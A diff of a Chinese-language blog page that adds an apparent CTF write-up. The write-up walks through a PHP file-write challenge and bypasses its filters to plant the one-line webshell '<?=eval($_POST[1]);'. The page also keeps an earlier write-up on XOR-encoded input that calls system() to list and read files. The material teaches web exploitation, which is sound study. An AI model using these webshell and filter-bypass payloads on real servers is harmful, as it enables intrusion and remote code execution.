@@ -208,7 +208,7 @@
 
     
     <article
-  id="post-ssti"
+  id="post-disable_function"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -217,14 +217,34 @@
   <div class="article-inner">
      
     <div class="article-meta">
-      <a href="/2023/01/18/ssti/" class="article-date">
+      <a href="/2023/01/18/disable_function/" class="article-date">
   <time datetime="2023-01-18T06:53:42.500Z" itemprop="datePublished">2023-01-18</time>
 </a>    
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-   
+  <p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== False)    </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nononono!&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f_name&#x27;</span>]))</span><br><span class="line">&#123;<span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f_name&#x27;</span>];</span><br><span class="line"> <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f_content&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?ph.|flag/i&#x27;</span>, <span class="variable">$content</span>) !== <span class="number">0</span>)</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt; <span class="number">22</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;why are you so LONG?&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>, <span class="variable">$content</span>))    </span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&quot;ok&quot;</span>);&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/disable_function.png"></p>
+<p>先从前面看起</p>
+<p><code>$query = urldecode($_SERVER[&quot;QUERY_STRING&quot;]);</code> 这部分是从给赋值的？开始往后面取值</p>
+<p>例如: <a target="_blank" rel="noopener" href="http://124.220.165.133:9909/?qusomn2655">http://124.220.165.133:9909/?qusomn2655</a>  则query=qusomn2655</p>
+<p><code>if (strpos($query, &#39;_&#39;) !== False)    die(&quot;nononono!&quot;);</code> strpos函数的意思是，从query中查找字符 _  ，如果没有找到，则返回False，因此这个部分过滤了 _ </p>
+<p>由于后面要给f_name赋值，可以用  .   来代替  _  即 f.name</p>
+<p><code>if (preg_match(&#39;/&lt;\?ph.|flag/i&#39;, $content) !== 0)</code>接下来看到正则表达式的位置，这个位置代表了过滤了content中的&lt;?ph 和flag字符，可以用&lt;?= 来代替&lt;?php。&lt;?= 是&lt;?=php echo 的简写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (strlen($content) &gt; 22)&#123;die(&#x27;why are you so LONG?&#x27;);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使得我们的content长度不能超过22</p>
+<p><code>file_put_contents($path, $content)</code>file_put_contents表示写入函数，path表示写入的文件名称，content表示写入文件的内容</p>
+<p>我们需要向服务器中写入一个php文件，在php文件里面写入可执行的木马，使其能够获取到其他文件的信息</p>
+<p>构造 GET参数:  ?f.name=7894.php  POST: f_content=&lt;?=eval($_POST[1]);  传入一句话木马</p>
+<p>然后将网页跳转到7894.php文件中   <a target="_blank" rel="noopener" href="http://124.220.165.133:9909/7894.php">http://124.220.165.133:9909/7894.php</a></p>
+<p>用剑蚁连接一下  flag就在里面</p>
+ 
       <!-- reward -->
       
     </div>
@@ -262,7 +282,7 @@
        
   <hr>
 <h1 id="title-web-study"><a href="#title-web-study" class="headerlink" title="title: web study"></a>title: web study</h1><hr>
-<p><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/1.png"><br>isset表示存在得到的code这个变量，然后将传递进来的code值，赋值给变量code<br>preg_match函数用于执行一个正则表达式匹配<br>这里过滤掉了变量code中的字母和数字。<br>但是我们需要对eval中的code传入命令，需要用到system ls cd /等等<br>因此这里需要想办法绕过preg_match变量<br>这里利用异或绕过<br>经过一次get传参会进行一次URL解码，所以我们可以将字符先进行url编码再进行异或得到我们想要的字符<br>%A0^%FF=&gt;_<br>%B8^%FF=&gt;G<br>%BA^%FF=&gt;E  <br>%AB^%FF=&gt;T<br>同时需要了解到PHP5中，assert()是一个函数，我们可以用=assert;_()这样的形式来执行代码。但在PHP7中，assert()变成了一个和eval()一样的语言结构，不再支持上面那种调用方法。<br>在PHP5当中assert()的作用和eval()相似都是执行，但是eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用，所以这种拼接的方法只能用assert而不能用eval<br><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/2.png"><br>利用代码<br><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/3.png"><br>可以得到php的版本为5.6.36<br><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/4.png"><br>因此可以写作${%ff%ff%ff%ff^%a0%b8%ba%ab}{%aa}来代表get传参得到的值<br>然后可以令%aa=system<br>这里使%aa=system，然后带上（）<br>（）内容是执行的命令，这里可以再次利用${%ff%ff%ff%ff^%a0%b8%ba%ab}{%bb}<br>将%aa换为%bb，然后令%bb=cd /;ls<br>得到文件夹，剩下的直接cat即可<br><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/1.png"><br>isset表示存在得到的code这个变量，然后将传递进来的code值，赋值给变量code<br>preg_match函数用于执行一个正则表达式匹配<br>这里过滤掉了变量code中的字母和数字。<br>但是我们需要对eval中的code传入命令，需要用到system ls cd /等等<br>因此这里需要想办法绕过preg_match变量<br>这里利用异或绕过<br>经过一次get传参会进行一次URL解码，所以我们可以将字符先进行url编码再进行异或得到我们想要的字符<br>%A0^%FF=&gt;_<br>%B8^%FF=&gt;G<br>%BA^%FF=&gt;E<br>%AB^%FF=&gt;T<br>同时需要了解到PHP5中，assert()是一个函数，我们可以用=assert;_()这样的形式来执行代码。但在PHP7中，assert()变成了一个和eval()一样的语言结构，不再支持上面那种调用方法。<br>在PHP5当中assert()的作用和eval()相似都是执行，但是eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用，所以这种拼接的方法只能用assert而不能用eval<br><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/2.png"><br>利用代码<br><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/3.png"><br>可以得到php的版本为5.6.36<br><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/4.png"><br>因此可以写作${%ff%ff%ff%ff^%a0%b8%ba%ab}{%aa}来代表get传参得到的值<br>然后可以令%aa=system<br>这里使%aa=system，然后带上（）<br>（）内容是执行的命令，这里可以再次利用${%ff%ff%ff%ff^%a0%b8%ba%ab}{%bb}<br>将%aa换为%bb，然后令%bb=cd /;ls<br>得到文件夹，剩下的直接cat即可<br><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/5.png"></p>
  
       <!-- reward -->
       
